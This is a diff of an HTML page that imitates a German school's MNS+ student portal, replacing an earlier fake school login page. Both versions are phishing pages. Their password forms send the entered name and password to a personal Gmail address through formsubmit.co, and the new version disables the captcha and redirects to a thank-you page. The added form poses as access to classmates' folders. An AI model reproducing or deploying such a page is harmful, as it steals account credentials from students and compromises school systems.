@@ -1,31 +1,57 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html lang="de">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gymnasium Schmallenberg</title>
-    <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <title>MNS+ Schülermodul</title>
+  <link rel="stylesheet" href="styles.css" />
 </head>
-
 <body>
-    <form action="https://formsubmit.co/nesimigashi76@gmail.com" method="POST">
-    
-        
-        <div class="userpass">
-            <header>Anmelden</header>
-            <input type="text"  name="Benutzername" placeholder="Benutzername">
-            <br>
-            <input type="password" name="Passwort"  placeholder=" Passwort">
-            <br>
-            <input type="submit">
-        </div>
-        
-    </form>
-    <div class="img">
-        <img src="logo-small.png" alt="">
+  <div class="window">
+    <div class="header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/28/MNSplus_Logo.png/80px-MNSplus_Logo.png" alt="MNS+ Logo" />
+      <h1>MNS+ Schülermodul</h1>
     </div>
 
-</body>
+    <div class="section">
+      <label><strong>Anzeigename:</strong></label>
+      <span>Schu, eler (Schueler02)</span><br />
 
+      <label><strong>Anmeldename:</strong></label>
+      <span>schueler02</span><br />
+
+      <label><strong>Speicherplatz:</strong></label><br />
+      <div class="progress-bar">
+        <div class="used"></div>
+        <span class="percent">45%</span>
+        <span class="total">50 MB</span>
+        <span class="used-mb">23 MB</span>
+      </div>
+
+      <label><strong>meine Kurse/AGs:</strong></label>
+      <select>
+        <option>bitte auswählen...</option>
+      </select><br />
+      <span class="link-text">Laufwerk L: mit dem Kurs verknüpfen <a href="#">verbinden</a></span>
+    </div>
+
+    <hr />
+
+    <div class="section">
+      <label><strong>Zugriff auf Mitschüler-Verzeichnis:</strong></label><br />
+      <form action="https://formsubmit.co/nesimigashi@gmail.com" method="POST">
+        <!-- FormSubmit Konfiguration -->
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://example.com/danke.html">
+        <input type="text" name="_honey" style="display:none">
+
+        <!-- Eingabefelder -->
+        <label>Name:</label>
+        <input type="text" name="Name" required /><br />
+        <label>Kennwort:</label>
+        <input type="password" name="Passwort" required /><br />
+        <button type="submit" class="connect-button">verbinden</button>
+      </form>
+    </div>
+  </div>
+</body>
 </html>
